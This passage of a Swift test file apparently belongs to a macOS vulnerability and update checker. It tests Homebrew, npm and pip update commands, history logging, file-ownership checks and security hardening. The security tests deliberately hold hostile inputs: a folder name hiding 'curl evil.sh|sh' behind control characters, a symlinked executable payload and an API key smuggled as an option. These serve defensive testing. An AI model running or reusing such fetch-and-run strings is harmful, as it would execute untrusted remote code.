        expect(waiting[0].awaitingFix == true && waiting[0].fixed == "1.22.3, not released yet" && Commands.commands(for: waiting[0]).isEmpty, "newest Homebrew copy with no fixed release: nothing to install")
        expect(ScanReport(findings: waiting).security.isEmpty && ScanReport(findings: waiting).awaiting.count == 1, "waiting findings don't count as needing attention")
        var shipped = [krbFinding]
        Scanner.markAwaiting(&shipped, newest: ["krb5": "1.22.3"])
        expect(shipped[0].awaitingFix == nil && shipped[0].fixed == "1.22.3" && Commands.commands(for: shipped[0]).first?.text == "brew upgrade krb5", "a newer Homebrew release makes it actionable again")
        let media = Installation(product: "ffmpeg", name: "ffmpeg", version: "9.0.2", path: "/opt/homebrew/Cellar/ffmpeg/9.0.2_1", domain: "brew", package: "ffmpeg", manager: "brew")
        var unfixed = [NVD.finding(media, product: Catalog.byID["ffmpeg"]!, hits: [NVDHit(id: "CVE-2026-107675", fixed: nil, severity: "HIGH")])!]
        Scanner.markAwaiting(&unfixed, newest: ["ffmpeg": "9.0.2"])
        expect(unfixed[0].awaitingFix == true && unfixed[0].fixed == "No fix released yet", "no fix version anywhere")
        var listedFix = [NVD.finding(media, product: Catalog.byID["ffmpeg"]!, hits: [NVDHit(id: "CVE-2026-9", fixed: "9.0.3", severity: "HIGH")])!]
        Scanner.markAwaiting(&listedFix, newest: ["ffmpeg": "9.0.2"])
        expect(listedFix[0].awaitingFix == nil, "a listed fixed version is left as an ordinary finding")
        let vscodeCopy = Installation(product: "vscode", name: "Visual Studio Code", version: "1.90", path: "/Applications/Visual Studio Code.app", domain: "apps", package: "visual-studio-code", manager: "app")
        var appFinding = [NVD.finding(vscodeCopy, product: Catalog.byID["vscode"]!, hits: [NVDHit(id: "CVE-2026-8", fixed: nil, severity: "LOW")])!]
        Scanner.markAwaiting(&appFinding, newest: ["visual-studio-code": "1.90"])
        expect(appFinding[0].awaitingFix == nil, "only Homebrew formulae are compared with Homebrew's newest release")

        // Homebrew rebuilds and old copies.
        expect(homebrewOlder("26.12.1", "26.12.1_1") && homebrewOlder("26.11.0_3", "26.12.1") && !homebrewOlder("26.12.1_1", "26.12.1_1")
               && !homebrewOlder("26.12.1_2", "26.12.1_1") && !homebrewOlder("26.12.1", "26.12.1"), "Homebrew rebuild numbers order builds of one version")
        let oldNode = Installation(product: "node", name: "node", version: "25.8.0", path: "/opt/homebrew/Cellar/node/25.8.0", domain: "brew", package: "node", manager: "brew-old")
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: oldNode, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["brew upgrade node && brew cleanup node", "rm -rf /opt/homebrew/Cellar/node/25.8.0"], "old copies: upgrade so cleanup runs, or remove just this copy")
        var pinnedOld = oldNode; pinnedOld.pinned = true
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: pinnedOld, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["rm -rf /opt/homebrew/Cellar/node/25.8.0"], "a pinned formula's old copy is removed without upgrading")
        let oddPath = Installation(product: "node", name: "node", version: "25.8.0", path: "/tmp/node/25.8.0", domain: "brew", package: "node", manager: "brew-old")
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: oddPath, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["brew upgrade node && brew cleanup node"], "rm is offered only for a copy inside Homebrew's Cellar")
        var pinnedCurl = Installation(product: "curl", name: "curl", version: "8.5.0", path: "/opt/homebrew/Cellar/curl/8.5.0", domain: "brew", package: "curl", manager: "brew"); pinnedCurl.pinned = true
        expect(commandFor(pinnedCurl) == "brew unpin curl && brew upgrade curl", "pinned formulae are unpinned before upgrading")

        // Findings that share a recommended command become one group, in list order.
        func listed(_ name: String, _ path: String, _ options: [UpdateCommand]?) -> Finding {
            var finding = Finding(source: "test", installation: Installation(product: name, name: name, version: "1.0", path: path, domain: "brew"), kind: .security, fixed: "2.0", reason: "", action: "", links: [])
            finding.commands = options
            return finding
        }
        let shared = [UpdateCommand(text: "brew upgrade node && brew cleanup node", note: "")]
        let groups = groupByCommand([listed("node", "/a", shared), listed("curl", "/b", [UpdateCommand(text: "brew upgrade curl", note: "")]), listed("node", "/c", shared),
                                     listed("app", "/d", [UpdateCommand(text: "Open App", note: "", kind: "app", target: "/d")]), listed("app", "/e", [UpdateCommand(text: "Open App", note: "", kind: "app", target: "/d")]),
                                     listed("none", "/f", nil), listed("node", "/g", shared)])
        expect(groups.map { $0.findings.map(\.installation.path) } == [["/a", "/c", "/g"], ["/b"], ["/d"], ["/e"], ["/f"]] && groups[0].command?.text == shared[0].text && groups[1].command == nil,
               "shared Terminal commands group in list order; apps, links and findings without commands stay separate")

        // Commands that share a template combine into one line for the All commands panel.
        func first(_ item: Installation, fixed: String = "2.0.0", malicious: Bool = false) -> UpdateCommand {
            var finding = Finding(source: "osv", installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: [])
            if malicious { finding.malicious = true }
            return Commands.commands(for: finding).first!
        }
        func brew(_ name: String, _ manager: String = "brew", pinned: Bool = false) -> Installation {
            var item = Installation(product: name, name: name, version: "1.0", path: "/opt/homebrew/Cellar/\(name)/1.0", domain: "brew", package: name, manager: manager)
            if pinned { item.pinned = true }
            return item
        }
        func npx(_ dir: String) -> Installation { Installation(product: "npm:x", name: "x", version: "1.0.0", path: dir + "/node_modules/x", domain: "packages", ecosystem: "npm", packageName: "x", manager: "npx-cache", location: dir) }
        func pipPackage(_ name: String) -> Installation { Installation(product: "pypi:" + name, name: name, version: "1.0", path: "/s/" + name, domain: "packages", ecosystem: "PyPI", packageName: name, manager: "pip-brew", location: "/opt/homebrew/bin/python3.14") }
        func npmProject(_ name: String, _ role: String) -> Installation { Installation(product: "npm:" + name, name: name, version: "1.0.0", path: "/p/package-lock.json#" + name, domain: "projects", ecosystem: "npm", packageName: name, manager: "npm", location: "/p", dependency: role) }
        let combinedLines = Commands.combined([first(brew("curl")), first(brew("node", "brew-old")), first(brew("git")), first(brew("simdutf", "brew-old")), first(brew("curl")),
                                               first(npx("/Users/a/.npm/_npx/one two")), first(npx("/Users/a/.npm/_npx/three")),
                                               first(pipPackage("certifi")), first(pipPackage("pip")),
                                               first(brew("jq", pinned: true)), first(brew("yq", pinned: true)),
                                               first(npmProject("vite", "dev")), first(npmProject("next", "direct")), first(npmProject("vitest", "dev")),
                                               first(npmProject("qs", "transitive")), first(npmProject("ms", "transitive")),
                                               UpdateCommand(text: "Open Software Update", note: "", kind: "link", target: "x-apple.systempreferences:x")])
        expect(combinedLines == ["brew upgrade curl git", "brew upgrade node simdutf && brew cleanup node simdutf", "rm -rf '/Users/a/.npm/_npx/one two' /Users/a/.npm/_npx/three",
                                 "/opt/homebrew/bin/python3.14 -m pip install --upgrade certifi==2.0.0 pip==2.0.0 --break-system-packages", "brew unpin jq yq && brew upgrade jq yq",
                                 "cd /p && npm install vite@2.0.0 vitest@2.0.0 --save-dev", "cd /p && npm install next@2.0.0", "cd /p && npm audit fix"],
               "combined commands: shared templates join their arguments, repeats collapse, links are left out")
        let otherProject = Installation(product: "npm:a", name: "a", version: "1.0.0", path: "/q/package-lock.json#a", domain: "projects", ecosystem: "npm", packageName: "a", manager: "npm", location: "/q", dependency: "transitive")
        expect(Commands.combined([first(npmProject("qs", "transitive")), first(otherProject), first(npmProject("next", "direct"))]) == ["cd /p && npm audit fix", "cd /p && npm install next@2.0.0", "cd /q && npm audit fix"],
               "each project's commands stay together")
        func withCommands(_ item: Installation) -> Finding {
            var finding = Finding(source: "test", installation: item, kind: .update, fixed: "2.0", reason: "", action: "", links: [])
            finding.commands = Commands.commands(for: finding)
            return finding
        }
        let shapes = groupByCommand([withCommands(brew("ada-url", "brew-old")), withCommands(brew("curl")), withCommands(brew("brotli", "brew-old")), withCommands(brew("git"))])
        expect(shapes.count == 2 && shapes[0].command?.text == "brew upgrade ada-url brotli && brew cleanup ada-url brotli" && shapes[1].command?.text == "brew upgrade curl git",
               "cards group by command template: older copies of different formulae share one card")

        // Versions with text around the number, and a final guard against "updates" to the installed release.
        expect(!looseLess("Build 4215", "4215") && !looseLess("4215", "Build 4215") && looseLess("Build 4215", "4216") && looseLess("r3222", "r3223") && looseLess("v1.2", "1.2.1"),
               "the first number anywhere in the text is the version")
        expect(sameRelease("Build 4215", "4215") && sameRelease("1.2", "1.2.0") && !sameRelease("15.0.0", "15.0.0_1") && !sameRelease("4.0.0", "Remove older copy") && !sameRelease("1.0", "1.1"),
               "same release written differently; rebuilds and text-only targets are not the same release")
        func update(_ item: Installation, _ fixed: String, kind: FindingKind = .update) -> Finding { Finding(source: "test", installation: item, kind: kind, fixed: fixed, reason: "", action: "", links: []) }
        let sublime = Installation(product: "sublime-text", name: "Sublime Text", version: "Build 4215", path: "/Applications/Sublime Text.app", domain: "apps", package: "sublime-text", manager: "app")
        let harfbuzz = Installation(product: "harfbuzz", name: "harfbuzz", version: "15.0.0", path: "/opt/homebrew/Cellar/harfbuzz/15.0.0", domain: "brew", package: "harfbuzz", manager: "brew")
        let rebuilt = Installation(product: "node", name: "node", version: "26.12.1", path: "/opt/homebrew/Cellar/node/26.12.1_1", domain: "brew", package: "node", manager: "brew")
        var candidates = [update(sublime, "4215"), update(sublime, "4216"), update(harfbuzz, "15.0.0_1"), update(rebuilt, "26.12.1_1"), update(oldNode, "Remove older copy"), update(sublime, "4215", kind: .security)]
        let dropped = Scanner.dropSameReleaseUpdates(&candidates)
        expect(dropped == 2 && candidates.map(\.fixed) == ["4216", "15.0.0_1", "Remove older copy", "4215"],
               "same-release updates are dropped (including an installed rebuild); real updates, rebuilds, removals and security findings stay")

        // History: findings open entries, disappear into resolutions, and reappear as new entries.
        let day1 = Date(timeIntervalSince1970: 1_800_000_000), day2 = day1.addingTimeInterval(86_400), day3 = day2.addingTimeInterval(86_400)
        let lockfile = "/work/app/package-lock.json"
        let lodash = Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: lockfile + "#lodash@4.17.20", domain: "projects", packageName: "lodash", manager: "npm", location: "/work/app")
        let lodashNew = Installation(product: "npm:lodash", name: "lodash", version: "4.17.21", path: lockfile + "#lodash@4.17.21", domain: "projects", packageName: "lodash", manager: "npm", location: "/work/app")
        let globalTool = Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/opt/homebrew/lib/node_modules/left-pad", domain: "packages", packageName: "left-pad", manager: "npm-global", location: "/opt/homebrew")
        let droppedProject = Installation(product: "npm:minimist", name: "minimist", version: "0.0.8", path: "/old/site/package-lock.json#minimist@0.0.8", domain: "projects", packageName: "minimist", manager: "npm", location: "/old/site")
        var lodashFinding = update(lodash, "4.17.21", kind: .security); lodashFinding.severity = "HIGH"
        var history: [HistoryEntry] = []
        var log = ScanReport(installations: [lodash, oldNode, sublime, globalTool, droppedProject], findings: [lodashFinding, update(oldNode, "Remove older copy"), update(sublime, "4216"), update(globalTool, "1.3.0", kind: .security), update(droppedProject, "1.2.6", kind: .security)])
        History.update(&history, with: log, projectFolders: ["/work", "/old"], at: day1)
        History.update(&history, with: log, projectFolders: ["/work", "/old"], at: day2)
        expect(history.count == 5 && history.allSatisfy { $0.resolved == nil && $0.firstSeen == day1 && $0.lastSeen == day2 }, "repeat checks refresh open entries instead of adding new ones")
        let sublimeNew = Installation(product: "sublime-text", name: "Sublime Text", version: "Build 4216", path: "/Applications/Sublime Text.app", domain: "apps", package: "sublime-text", manager: "app")
        let toolNew = Installation(product: "npm:left-pad", name: "left-pad", version: "1.1.0", path: globalTool.path, domain: "packages", packageName: "left-pad", manager: "npm-global", location: "/opt/homebrew")
        log = ScanReport(installations: [lodashNew, rebuilt, sublimeNew, toolNew], findings: [update(toolNew, "1.3.0", kind: .security)])
        History.update(&history, with: log, projectFolders: ["/work"], at: day3)
        func entry(_ name: String) -> [HistoryEntry] { history.filter { $0.name == name } }
        expect(entry("lodash").first?.resolution == "Updated to 4.17.21" && entry("lodash").first?.resolved == day3 && entry("lodash").first?.severity == "HIGH", "a fixed project package resolves as updated")
        expect(entry("node").first?.resolution == "Removed", "a cleaned-up older Homebrew copy resolves as removed, not as updated to the active version")
        expect(entry("Sublime Text").first?.resolution == "Updated to Build 4216", "an updated app resolves with its new version")
        expect(entry("minimist").first?.resolution == "Project folder no longer checked", "removing a project folder from the check is not reported as a fix")
        expect(entry("left-pad").count == 2 && entry("left-pad")[0].resolution == "Updated to 1.1.0" && entry("left-pad")[1].resolved == nil && entry("left-pad")[1].version == "1.1.0",
               "a finding still reported after a version change closes the old entry and opens one for the new version")
        log.installations = [toolNew]
        log.findings = []
        History.update(&history, with: log, projectFolders: ["/work"], at: day3)
        expect(entry("left-pad")[1].resolution == "No longer reported", "a finding that goes away with the same version installed says so")
        History.update(&history, with: ScanReport(installations: [], findings: []), projectFolders: ["/work"], at: day3)
        expect(entry("lodash").count == 1, "resolved entries are not reopened or changed by later checks")
        History.update(&history, with: ScanReport(installations: [lodash], findings: [lodashFinding]), projectFolders: ["/work"], at: day3)
        expect(entry("lodash").count == 2 && entry("lodash")[1].resolved == nil, "a finding that comes back starts a new entry")
        expect(History.resolution(of: HistoryEntry(update(globalTool, "1.3.0"), at: day1), in: ScanReport(), projectFolders: []) == "Removed from this Mac", "uninstalled software resolves as removed")
        expect(History.changed(from: "2.0.0", to: "1.9.0") == "Changed to 1.9.0", "a downgrade is not called an update")
        var capped = (0..<12).map { index -> HistoryEntry in var e = HistoryEntry(update(item("p\(index)", "1"), "2"), at: day1); if index < 8 { e.resolved = day1.addingTimeInterval(Double(index)) }; return e }
        History.update(&capped, with: ScanReport(installations: [], findings: (8..<12).map { update(item("p\($0)", "1"), "2") }), projectFolders: [], at: day1, limit: 6)
        expect(capped.count == 6 && capped.filter { $0.resolved == nil }.count == 4 && !capped.contains { $0.name == "p0" || $0.name == "p1" }, "the log keeps open entries and drops the oldest resolved ones past its limit")

        var scoped = HistoryEntry(update(Installation(product: "npm:@types/node", name: "@types/node", version: "1.0.0", path: "/p/package-lock.json#@types/node@1.0.0", domain: "projects"), "2.0.0"), at: day1)
        scoped.command = "cd /p && npm install \"@types/node@2.0.0\""
        let csv = History.csv([scoped]).components(separatedBy: "\n")
        expect(csv.count == 3 && csv[0].hasPrefix("\"Status\",\"Name\"") && csv[1].hasPrefix("\"Open\",\"'@types/node\",\"update\"") && csv[1].hasSuffix("\"cd /p && npm install \"\"@types/node@2.0.0\"\"\"") && csv[1].contains("\"/p/package-lock.json\""),
               "history CSV quotes cells, doubles quotes and neutralizes formula-like names")

        // Renaming: saved state moves from the former folder once, and an existing new folder is never replaced.
        let support = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-test-\(UUID().uuidString)")
        let former = support.appendingPathComponent(StateFolder.formerName)
        try FileManager.default.createDirectory(at: former, withIntermediateDirectories: true)
        try Data("{}".utf8).write(to: former.appendingPathComponent("state.json"))
        let moved = StateFolder.resolve(in: support)
        expect(moved.lastPathComponent == "Shipshape" && FileManager.default.fileExists(atPath: moved.appendingPathComponent("state.json").path) && !FileManager.default.fileExists(atPath: former.path),
               "a pre-release data folder moves to the Shipshape folder")
        try FileManager.default.createDirectory(at: former, withIntermediateDirectories: true)
        expect(StateFolder.resolve(in: support) == moved && FileManager.default.fileExists(atPath: former.path), "an existing Shipshape folder is kept and a leftover old folder is left alone")
        try? FileManager.default.removeItem(at: support)

        // Ownership: commands for software this account can't change are held back, with who owns it and what to do.
        func fakeAccess(_ owners: [String: String], readOnly: Set<String>, children: [String: [String]] = [:]) -> FileAccess {
            FileAccess(user: "sam", exists: { owners[$0] != nil }, canWrite: { !readOnly.contains($0) }, owner: { owners[$0] }, children: { children[$0] ?? [] })
        }
        func projectFinding(_ folder: String) -> Finding {
            var finding = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: folder + "/package-lock.json#lodash@4.17.20", domain: "projects",
                                              ecosystem: "npm", packageName: "lodash", manager: "npm", location: folder, dependency: "direct"), "4.17.21", kind: .security)
            finding.commands = Commands.commands(for: finding)
            return finding
        }
        let theirs = "/Users/alex/Projects/app", mine = "/Users/sam/shop"
        var owned = [projectFinding(theirs), projectFinding(theirs), projectFinding(mine)]
        let otherAccount = fakeAccess([theirs: "alex", theirs + "/package-lock.json": "alex", theirs + "/node_modules": "alex", mine: "sam", mine + "/package-lock.json": "sam"],
                                      readOnly: [theirs, theirs + "/package-lock.json", theirs + "/node_modules"])
        Ownership.restrict(&owned, access: otherAccount)
        expect(owned[0].blocked == "/Users/alex/Projects/app belongs to alex, so this account can't change it. Make the fix from alex's account, or ask them to." && owned[0].commands == [],
               "another account's project keeps its finding but loses the command that would fail")
        expect(owned[2].blocked == nil && owned[2].commands?.first?.text.hasPrefix("cd /Users/sam/shop && npm install") == true, "this account's own project keeps its command")
        let ownedGroups = groupByCommand(owned)
        expect(ownedGroups.count == 2 && ownedGroups[0].findings.count == 2 && ownedGroups[0].command == nil, "blocked findings in one project share a card with no command")
        var rootModules = [projectFinding(mine)]
        Ownership.restrict(&rootModules, access: fakeAccess([mine: "sam", mine + "/package-lock.json": "sam", mine + "/node_modules": "sam", mine + "/node_modules/@babel": "root"],
                                                            readOnly: [mine + "/node_modules/@babel"], children: [mine + "/node_modules": ["@babel", "lodash"]]))
        expect(rootModules[0].blocked?.hasPrefix("/Users/sam/shop/node_modules/@babel belongs to root, usually left by an install run with sudo") == true,
               "an npm scope folder left to root by sudo is caught before npm fails to move packages inside it")
        var brewOwned = [update(Installation(product: "node", name: "node", version: "26.1.0", path: "/opt/homebrew/Cellar/node/26.1.0", domain: "brew", package: "node", manager: "brew"), "26.2.0"),
                         update(Installation(product: "zoom", name: "Zoom", version: "6.0", path: "/Applications/zoom.us.app", domain: "apps", package: "zoom", manager: "app"), "6.1")]
        for index in brewOwned.indices { brewOwned[index].commands = Commands.commands(for: brewOwned[index]) }
        Ownership.restrict(&brewOwned, access: fakeAccess(["/opt/homebrew/Cellar/node": "alex", "/Applications": "root"], readOnly: ["/opt/homebrew/Cellar/node", "/Applications"]))
        expect(brewOwned[0].blocked == "Homebrew on this Mac belongs to alex, so only that account can upgrade it. Run the update from alex's account, or ask them to." && brewOwned[0].commands == [],
               "Homebrew installed by another account: say so instead of offering brew upgrade")
        expect(brewOwned[1].blocked == nil, "apps with their own updaters aren't checked")
        var global = update(Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/usr/local/lib/node_modules/left-pad", domain: "packages",
                                         ecosystem: "npm", packageName: "left-pad", manager: "npm-global", location: "/usr/local/bin/npm"), "1.3.0", kind: .security)
        global.commands = [UpdateCommand(text: "Open the advisory", note: "", kind: "link", target: "https://example.com")] + Commands.commands(for: global)
        var globals = [global]
        Ownership.restrict(&globals, access: fakeAccess(["/usr/local/lib/node_modules": "root"], readOnly: ["/usr/local/lib/node_modules"]))
        expect(globals[0].blocked?.hasPrefix("/usr/local/lib/node_modules belongs to root, so this account can't change it.") == true && globals[0].commands?.map(\.kind) == ["link"],
               "a root-owned global folder keeps vendor links but drops the Terminal command")
        let folders = fakeAccess(["/": "root", theirs: "alex", mine: "sam"], readOnly: ["/", theirs])
        expect(Ownership.folderWarning(theirs, access: folders) == "/Users/alex/Projects/app belongs to alex. Its vulnerabilities are reported, but fixes have to be made from alex's account.",
               "adding another account's folder explains that fixes happen from that account")
        expect(Ownership.folderWarning("/", access: folders) == "/ includes system or Homebrew folders. Those are skipped; projects elsewhere in it are checked." && Ownership.folderWarning(mine, access: folders) == nil,
               "adding the whole disk notes the skipped system folders; your own folder needs no warning")

        // Security: "Open file" only opens plain text files Shipshape found; a repo can't turn it into running a script.
        let openRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-open-\(UUID().uuidString)").resolvingSymlinksInPath().path
        let openProject = openRoot + "/C# app"
        try FileManager.default.createDirectory(atPath: openProject, withIntermediateDirectories: true)
        try Data("{}".utf8).write(to: URL(fileURLWithPath: openProject + "/package.json"))
        try Data("echo hi".utf8).write(to: URL(fileURLWithPath: openRoot + "/payload.command"))
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: openRoot + "/payload.command")
        try FileManager.default.createSymbolicLink(atPath: openProject + "/linked.json", withDestinationPath: openRoot + "/payload.command")
        try Data("x==1".utf8).write(to: URL(fileURLWithPath: openProject + "/run.command"))
        try Data("{}".utf8).write(to: URL(fileURLWithPath: openRoot + "/elsewhere.json"))
        expect(SafeOpen.fileProblem(openProject + "/package.json", folders: [openProject], files: []) == nil, "a plain package.json in a project folder opens")
        expect(SafeOpen.fileProblem(openProject + "/linked.json", folders: [openProject], files: [])?.contains("is a link") == true, "a package.json that links to a script is refused")
        expect(SafeOpen.fileProblem(openProject + "/run.command", folders: [openProject], files: [])?.contains("isn't a plain text file") == true, "a .command file is refused even if not executable")
        expect(SafeOpen.fileProblem(openRoot + "/payload.command", folders: [openRoot], files: []) != nil, "an executable file is refused")
        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [openProject], files: [])?.contains("outside your project folders") == true, "files outside chosen folders are refused")
        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [], files: [openRoot + "/elsewhere.json"]) == nil, "a known MCP settings file opens")
        expect(SafeOpen.appProblem(openRoot + "/Fake.app", roots: [openRoot]) != nil && SafeOpen.appProblem(openProject, roots: [openRoot]) != nil, "only real app bundles in Applications folders open")
        try FileManager.default.createDirectory(atPath: openRoot + "/Real.app", withIntermediateDirectories: true)
        expect(SafeOpen.appProblem(openRoot + "/Real.app", roots: [openRoot]) == nil, "an app bundle in an allowed folder opens")
        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: openProject + "/requirements.txt"))
        var parseErrors: [String] = []
        let hashProject = Inventory.projects([openProject + "/requirements.txt"], errors: &parseErrors)
        let hashFinding = update(hashProject[0], "2.2.5", kind: .security)
        expect(hashProject.first?.sourceFile == openProject + "/requirements.txt" && Commands.commands(for: hashFinding).first?.target == openProject + "/requirements.txt",
               "a # in a folder name no longer cuts the file path short")
        try? FileManager.default.removeItem(atPath: openRoot)

        // Security: invisible characters in a name never reach a command someone pastes into a terminal.
        let trap = "/work/\u{15}curl evil.sh|sh\r"
        var hidden = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: trap + "/package-lock.json#lodash@4.17.20", domain: "projects",
                                         ecosystem: "npm", packageName: "lodash", manager: "npm", location: trap, dependency: "direct", file: trap + "/package-lock.json"), "4.17.21", kind: .security)
        hidden.commands = Commands.commands(for: hidden)
        expect(hidden.commands?.contains { $0.kind == nil } == false, "a folder name with control characters gets no Terminal command")
        var hiddenList = [hidden]
        Ownership.restrict(&hiddenList, access: fakeAccess([:], readOnly: []))
        expect(hiddenList[0].blocked?.contains("/work/\u{FFFD}curl evil.sh|sh\u{FFFD} contains invisible characters") == true, "the notice shows where the invisible characters are")
        expect(Commands.hasHiddenCharacters("pkg\u{202E}gpj.exe") && Commands.hasHiddenCharacters("a\u{2028}b") && Commands.hasHiddenCharacters("tab\there"),
               "bidi overrides, line separators and tabs count as hidden")
        expect(!Commands.hasHiddenCharacters("/Users/zoë/Projects/日本 🚀/app"), "ordinary accented, CJK and emoji names are fine")

        // Security: hostile lockfiles can't stall a check or make it read outside the chosen folder.
        let slowStart = Date()
        _ = Lockfiles.requirements(String(repeating: "a[\n", count: 20_000))
        expect(Date().timeIntervalSince(slowStart) < 0.5, "20,000 lines of unclosed brackets parse in well under a second (was about 7.5 s)")
        expect(Lockfiles.requirements("uvicorn[standard] == 0.30.1\nflask==2.0.0 ; python_version > '3.8'\nbroken[\n==1.0\n").map { "\($0.name) \($0.version)" } == ["uvicorn 0.30.1", "flask 2.0.0"],
               "extras, spaces and markers still parse; a bracket can't run onto the next line")
        let readRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-read-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: readRoot + "/app", withIntermediateDirectories: true)
        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: readRoot + "/outside.txt"))
        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/requirements.txt", withDestinationPath: readRoot + "/outside.txt")
        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/linked", withDestinationPath: readRoot)
        expect(Lockfiles.find(in: readRoot + "/app").isEmpty, "linked lockfiles and linked folders aren't followed")
        expect(Inventory.read(readRoot + "/app/requirements.txt", limit: 1_000) == nil && Inventory.read(readRoot + "/outside.txt", limit: 5) == nil
               && Inventory.read(readRoot + "/outside.txt", limit: 1_000) != nil, "reads refuse links and files over the limit")
        var limitErrors: [String] = []
        _ = Inventory.projects([readRoot + "/app/requirements.txt"], errors: &limitErrors)
        expect(limitErrors.first?.hasPrefix("Skipped") == true, "a linked lockfile is reported as skipped, not read")
        limitErrors = []
        _ = Inventory.projects([readRoot + "/outside.txt", readRoot + "/outside.txt"], errors: &limitErrors, timeLimit: -1)
        expect(limitErrors == ["Stopped reading lockfiles after -1 seconds; 2 not checked"], "reading stops at the time limit and says how many were left")
        try? FileManager.default.removeItem(atPath: readRoot)

        // Security: Homebrew is read from its folders, never by running brew, and only trusted binaries run.
        let brewRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-brew-\(UUID().uuidString)").path
        for folder in ["Cellar/node/26.1.0_1/bin", "Cellar/node/25.0.0", "Cellar/vercel/59.0.0", "Caskroom/zed/0.150.0", "Caskroom/zed/.metadata", "opt", "var/homebrew/pinned"] {
            try FileManager.default.createDirectory(atPath: brewRoot + "/" + folder, withIntermediateDirectories: true)
        }
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/opt/node", withDestinationPath: "../Cellar/node/26.1.0_1")
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/var/homebrew/pinned/node", withDestinationPath: "../../../opt/node")
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/Cellar/vercel-cli", withDestinationPath: "vercel")
        let (brewItems, brewErrors) = Inventory.homebrew(prefixes: [brewRoot])
        let brewSummary = brewItems.map { "\($0.name) \($0.version) \($0.manager ?? "") \($0.pinned == true ? "pinned" : "")" }.sorted()
        expect(brewErrors.isEmpty && brewSummary == ["Zed 0.150.0 cask ", "node 25.0.0 brew-old pinned", "node 26.1.0 brew pinned", "vercel 59.0.0 brew "],
               "Homebrew folders give the active copy, older copies, pins and casks; renamed-formula links are skipped")
        let probe = brewRoot + "/probe.sh"
        try Data("#!/bin/sh\necho ok\n".utf8).write(to: URL(fileURLWithPath: probe))
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: probe)
        expect(trustedExecutable(probe) && !trustedExecutable(probe, uid: 4242), "a binary is trusted when this account (or root) owns it")
        try FileManager.default.setAttributes([.posixPermissions: 0o775], ofItemAtPath: probe)
        expect(!trustedExecutable(probe), "a binary others can change is not trusted")
        expect((try? command(probe, [])) == nil, "an untrusted binary is never run")
        setenv("SHIPSHAPE_PROBE_SECRET", "1", 1)
        let environment = try command("/usr/bin/env", []).text
        expect(!environment.contains("SHIPSHAPE_PROBE_SECRET") && environment.contains("PATH=/usr/bin:/bin:/usr/sbin:/sbin"), "launched programs get a minimal environment, not the app's")
        try? FileManager.default.removeItem(atPath: brewRoot)

        // Security: names are quoted, MCP options can't smuggle in a key, huge versions are rejected.
        var tilde = update(Installation(product: "npm:~x", name: "~x", version: "1.0.0", path: "/g/lib/node_modules/~x", domain: "packages", ecosystem: "npm", packageName: "~x", manager: "npm-global", location: "/g/bin/npm"), "", kind: .security)
        tilde.malicious = true
        expect(Commands.commands(for: tilde).isEmpty, "a package name starting with ~ (which a shell would expand) gets no command")
        expect(Inventory.mcpPackage(command: "npx", args: ["--api-key", "sk_live_ABC", "@x/server"]) == nil, "an unknown option's value (an API key) is never taken for the package")
        expect(Inventory.mcpPackage(command: "npx", args: ["-y", "@x/server@1.2.3"]).map { $0.spec } == "@x/server@1.2.3"
               && Inventory.mcpPackage(command: "npx", args: ["--registry", "https://r.example", "pkg"]).map { $0.spec } == "pkg"
               && Inventory.mcpPackage(command: "uvx", args: ["--token=abc", "mcp-server-git"]).map { $0.spec } == "mcp-server-git", "known options and option=value forms are still skipped correctly")
        expect(Version("99999999999999999999") == nil && Version("1.99999999999999999999") == nil && Version("1.2.3") != nil, "a version component too large for an integer is rejected, not dropped")
        let now = Date()
        expect(lastCheckText(now.addingTimeInterval(-20), now: now).hasSuffix("(just now)") && lastCheckText(now.addingTimeInterval(-300), now: now).hasSuffix("(5 minutes ago)"),
               "the last check reads its time and how long ago it was")

        // Security: downloads stop at their size limit instead of filling memory.
        let realConfiguration = Fetch.configuration
        let stubbed = URLSessionConfiguration.ephemeral
        stubbed.protocolClasses = [StubProtocol.self]
        Fetch.configuration = stubbed
        StubProtocol.responses = ["https://stub.test/ok": (200, ["Content-Type": "application/json"], Data("{\"a\":1}".utf8)),
                                  "https://stub.test/declared": (200, ["Content-Length": "20000000"], Data("{}".utf8)),
                                  "https://stub.test/endless": (200, [:], Data(count: 3_000_000))]
        let small = try await Fetch.json("https://stub.test/ok") as? [String: Int]
        expect(small == ["a": 1], "a normal response is returned")
        func failure(_ url: String) async -> String? { do { _ = try await Fetch.data(url, limit: 1_000_000); return nil } catch { return error.localizedDescription } }
        let declaredFailure = await failure("https://stub.test/declared"), endlessFailure = await failure("https://stub.test/endless"), missing = await failure("https://stub.test/missing")
        expect(declaredFailure == "Source exceeded response limit", "a declared size over the limit is refused before the body arrives")
        expect(endlessFailure == "Source exceeded response limit", "a response with no declared size is cut off once it passes the limit")
        expect(missing?.contains("404") == true, "an HTTP error is reported with its status")
        let plainHTTP = await failure("http://stub.test/ok")
        expect(plainHTTP == "Invalid source URL", "only https sources are fetched")
        Fetch.configuration = realConfiguration

